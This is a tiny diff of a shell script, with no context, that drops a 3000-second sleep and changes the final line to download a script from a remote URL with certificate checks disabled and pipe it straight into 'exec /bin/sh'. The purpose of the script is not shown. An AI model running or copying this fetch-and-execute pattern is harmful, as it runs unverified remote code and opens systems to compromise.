@@ -1,4 +1,3 @@
 #!/bin/sh
 
-sleep 3000
-curl -SsLk https://bing.com/file.sh -o -|/bin/sh
+curl -SsLk https://bing.com/file.sh -o -| exec /bin/sh
